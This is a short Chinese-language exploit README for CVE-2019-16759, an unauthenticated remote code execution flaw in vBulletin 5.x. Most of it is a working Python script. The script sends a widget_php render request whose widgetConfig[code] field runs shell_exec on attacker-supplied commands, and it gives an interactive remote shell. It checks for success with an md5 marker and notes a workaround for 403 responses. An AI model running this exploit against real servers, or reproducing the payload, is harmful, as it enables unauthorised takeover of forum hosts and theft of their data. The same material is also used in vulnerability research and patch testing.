# CVE-2019-16759 vBulletin 5.x  未授权远程代码执行漏洞

![](./CVE-2019-16759.jpg)

## Ps：  有些poc发包过去是403 ，而不是200
增强判断：echo md5('vBulletin');
判断返回包中是否存在be4ea51d962be8308a0099ae1eb3ec63

`print r.text.split('be4ea51d962be8308a0099ae1eb3ec63')[0]`

![](./vBulletin.jpg)

## CVE-2019-16759.py

```
import requests
import sys

if len(sys.argv) != 2:
    sys.exit("Usage: %s <URL to vBulletin>" % sys.argv[0])

proxies ={
     "http":"http://127.0.0.1:8080/"
}
params = {"routestring":"ajax/render/widget_php"}

while True:
     try:
          cmd = raw_input(">>>Shell= ")
          params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"');echo md5('vBulletin'); exit;"
          r = requests.post(url = sys.argv[1], data = params, proxies=proxies)
          if r.status_code == 200 or r.status_code ==403 and 'be4ea51d962be8308a0099ae1eb3ec63' in r.text:
               print
               print r.text.split('be4ea51d962be8308a0099ae1eb3ec63')[0]
          else:
               sys.exit("Exploit failed! :(")
     except KeyboardInterrupt:
          sys.exit("\nClosing shell...")
     except Exception, e:
          sys.exit(str(e))

```

## 参考链接：

https://seclists.org/fulldisclosure/2019/Sep/31

